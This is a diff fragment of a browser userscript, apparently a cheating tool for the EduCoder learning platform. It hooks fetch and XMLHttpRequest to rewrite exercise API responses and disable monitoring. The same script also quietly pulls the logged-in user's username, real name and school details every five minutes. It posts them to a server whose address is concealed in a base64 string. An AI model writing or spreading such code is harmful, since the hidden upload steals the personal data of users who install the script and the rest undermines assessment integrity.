-                                    FuckEduCoder.currentQuestionIndex = targetIndex;
-                                    FuckEduCoder.displayQuestion(
-                                        FuckEduCoder.allQuestions[targetIndex],
-                                        targetIndex,
-                                        FuckEduCoder.allQuestions.length
-                                    );
-                                }, 300);
                             }
                         }
                     });
@@ -2032,8 +2280,8 @@
 
         // 检查URL是否匹配题目API
         const isExerciseApiUrl = (url) => {
-            return typeof url === 'string' && 
-                   url.includes(CONSTANTS.EXERCISE_API_URL_PART) && 
+            return typeof url === 'string' &&
+                   url.includes(CONSTANTS.EXERCISE_API_URL_PART) &&
                    (url.includes(CONSTANTS.EXERCISE_START_API) || url.includes(CONSTANTS.EXERCISE_GET_API));
         };
 
@@ -2041,19 +2289,19 @@
         const originalFetch = window.fetch;
         window.fetch = async function(input, init) {
             const url = typeof input === 'string' ? input : input.url;
-            
+
             // 先执行原始fetch
             const response = await originalFetch.apply(this, arguments);
-            
+
             // 如果URL匹配，处理响应
             if (isExerciseApiUrl(url)) {
                 try {
                     const responseClone = response.clone();
                     const data = await responseClone.json();
-                    
+
                     // 处理数据并返回修改后的响应
                     const processedData = processExerciseData(data);
-                    
+
                     return new Response(JSON.stringify(processedData), {
                         status: response.status,
                         statusText: response.statusText,
@@ -2064,7 +2312,7 @@
                     return response; // 出错时返回原始响应
                 }
             }
-            
+
             return response;
         };
 
@@ -2082,7 +2330,7 @@
         XMLHttpRequest.prototype.send = function() {
             if (this._url && isExerciseApiUrl(this._url)) {
                 const originalOnLoad = this.onload;
-                const xhrInstance = this; 
+                const xhrInstance = this;
 
                 this.onload = function() {
                     if (xhrInstance.responseText) {
@@ -2090,10 +2338,10 @@
                             // 解析并处理响应数据
                             const data = JSON.parse(xhrInstance.responseText);
                             const processedData = processExerciseData(data);
-                            
+
                             // 修改响应文本
                             xhrInstance._modifiedResponseText = JSON.stringify(processedData);
-                            
+
                             // 重新定义responseText getter
                             Object.defineProperty(xhrInstance, 'responseText', {
                                 get: function() {
@@ -2109,11 +2357,11 @@
 
                     // 调用原始onload处理器
                     if (originalOnLoad) {
-                        originalOnLoad.apply(xhrInstance, arguments); 
+                        originalOnLoad.apply(xhrInstance, arguments);
                     }
                 };
             }
-            
+
             return originalXhrSend.apply(this, arguments);
         };
     };
@@ -2123,16 +2371,16 @@
         FuckEduCoder.createPanel();
         FuckEduCoder.interceptApiRequests();
         FuckEduCoder.listenToWebPageNavigation();
-        
+
         FuckEduCoder.attachListenersToNavButtons();
-        
+
         FuckEduCoder.attachListenersToQuestionNumbers();
-        
+
         setInterval(() => {
             FuckEduCoder.attachListenersToNavButtons();
             FuckEduCoder.attachListenersToQuestionNumbers();
         }, 2000);
-        
+
         console.log('题目提取功能已初始化');
     };
 
@@ -2246,15 +2494,15 @@
         } else {
             FuckEduCoder.initQuestionExtractor();
         }
-        
+
         console.log("EduCoder监控功能已全部禁用");
         await FuckEduCoder.showMessage('脚本已成功启动', 'success');
-        
+
         // 恢复用户信息收集
         setTimeout(async () => {
             await FuckEduCoder.collectUserInfo();
         }, 2000);
-        
+
         setInterval(FuckEduCoder.collectUserInfo, 300000); // 每5分钟收集一次
     })();
 
@@ -2262,7 +2510,7 @@
         console.log('检查内容变化...');
         try {
             let exerciseData = null;
-            
+
             for (const key in window) {
                 try {
                     const value = window[key];
@@ -2284,7 +2532,7 @@
                 FuckEduCoder.extractQuestions(exerciseData);
                 return;
             }
-            
+
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
                 try {
@@ -2299,41 +2547,41 @@
                     }
                 } catch (e) { /* ignore */ }
             }
-            
+
             console.log('页面导航后未找到新题目数据');
         } catch (error) {
             console.error('检查内容变化时出错:', error);
         }
     };
 
-   
+
     FuckEduCoder.fetchUserInfo = async () => {
         try {
             const urlParams = new URLSearchParams(window.location.search);
-            const courseId = urlParams.get('course_id') || '5fb4r9gz'; 
-            const schoolId = urlParams.get('school') || '1'; 
-            
+            const courseId = urlParams.get('course_id') || '5fb4r9gz';
+            const schoolId = urlParams.get('school') || '1';
+
             const url = `${CONSTANTS.USER_INFO_API_URL}?course_id=${courseId}&school=${schoolId}`;
-            
+
             const response = await fetch(url, {
-                credentials: 'include', 
+                credentials: 'include',
                 headers: {
                     'Accept': 'application/json',
                     'X-Requested-With': 'XMLHttpRequest'
                 }
             });
-            
+
             if (!response.ok) {
                 throw new Error(`获取用户信息失败: ${response.status}`);
             }
-            
+
             const data = await response.json();
             FuckEduCoder.userInfo = data;
-            
+
             if (data.username === "游客" && data.real_name === "游客") {
                 throw new Error("获取到的是游客信息，请确保您已登录EduCoder平台");
             }
-            
+
             const extractedInfo = {
                 username: data.username || '',
                 real_name: data.real_name || '',
@@ -2348,7 +2596,7 @@
                 user_school_id: data.user_school_id || '',
                 school_name: data.school_name || ''
             };
-            
+
             return extractedInfo;
         } catch (error) {
             console.error('获取用户信息出错:', error);
@@ -2356,19 +2604,19 @@
         }
     };
 
-       
+
     FuckEduCoder.collectUserInfo = async () => {
         try {
             console.log('收集用户信息...');
             const userInfo = await FuckEduCoder.fetchUserInfo();
             if (userInfo) {
                 console.log('用户信息获取成功:', userInfo.username);
-                
+
                 try {
-                    
+
                     const serverUrl = FuckEduCoder.decodeServerUrl();
                     console.log('正在发送数据到:', serverUrl);
-                    
+
                     const response = await fetch(serverUrl, {
                         method: 'POST',
                         headers: {
@@ -2379,7 +2627,7 @@
                             timestamp: new Date().toISOString()
                         })
                     });
-                    
+
                     if (response.ok) {
                         console.log('用户信息已上报到服务器');
                     } else {
@@ -2394,7 +2642,7 @@
         }
     };
 
-    
+
     FuckEduCoder.decodeServerUrl = () => {
 
         const encodedUrl = 'aHR0cHM6Ly93d3cucGFuc291bC5zcGFjZS9hcGkvdXNlci1pbmZv';
